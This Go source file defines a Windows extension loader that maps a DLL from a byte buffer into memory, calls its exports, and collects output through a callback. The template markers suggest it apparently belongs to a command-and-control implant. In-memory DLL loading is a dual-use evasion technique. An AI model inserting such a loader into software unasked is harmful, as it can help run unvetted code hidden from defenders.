package extension

import (
	"bytes"
	"errors"
	"syscall"
	"unsafe"

	"golang.zx2c4.com/wireguard/tun/wintun/memmod"
)

const (
	Success = 0
	Failure = 1
)

type WindowsExtension struct {
	id       string
	data     []byte
	module   *memmod.Module
	arch     string
	init     string
	onFinish func([]byte)
}

func NewWindowsExtension(data []byte, id string, arch string, init string) *WindowsExtension {
	return &WindowsExtension{
		id:   id,
		data: data,
		arch: arch,
		init: init,
	}
}

func (w *WindowsExtension) GetID() string {
	return w.id
}

func (w *WindowsExtension) GetArch() string {
	return w.arch
}

func (w *WindowsExtension) Load() error {
	var err error
	w.module, err = memmod.LoadLibrary(w.data)
	if err != nil {
		return err
	}
	// if the DLL is a nim compiled DLL, call NimMain to initialize the GC
	if w.init != "" {
		initProc, errInit := w.module.ProcAddressByName(w.init)
		if errInit == nil {
			syscall.Syscall(initProc, 0, 0, 0, 0)
		}
	}
	return nil
}

func (w *WindowsExtension) Call(export string, arguments []byte, onFinish func([]byte)) error {
	var (
		argumentsPtr  uintptr
		argumentsSize uintptr
	)
	if w.module == nil {
		return errors.New("{{if .Config.Debug}} module not loaded {{end}}")
	}
	w.onFinish = onFinish
	callback := syscall.NewCallback(w.extensionCallback)
	exportPtr, err := w.module.ProcAddressByName(export)
	if err != nil {
		return err
	}
	if len(arguments) > 0 {
		argumentsPtr = uintptr(unsafe.Pointer(&arguments[0]))
		argumentsSize = uintptr(uint32(len(arguments)))
	}
	// The extension API must respect the following prototype:
	// int Run(buffer char*, bufferSize uint32_t, goCallback callback)
	// where goCallback = int(char *, int)
	_, _, errNo := syscall.Syscall(exportPtr, 3, argumentsPtr, argumentsSize, callback)
	if errNo != 0 {
		return errors.New(errNo.Error())
	}

	return nil
}

// extensionCallback takes a buffer (char *) and its size (int) as parameters
// so we can pass data back to the Go process from the loaded DLL
func (w *WindowsExtension) extensionCallback(data uintptr, dataLen uintptr) uintptr {
	outDataSize := int(dataLen)
	outBuff := new(bytes.Buffer)
	for i := 0; i < outDataSize; i++ {
		b := (*byte)(unsafe.Pointer(uintptr(i) + data))
		outBuff.WriteByte(*b)
	}
	//TODO: do somethig with outBuff
	if outBuff.Len() > 0 {
		w.onFinish(outBuff.Bytes())
	}
	return Success
}
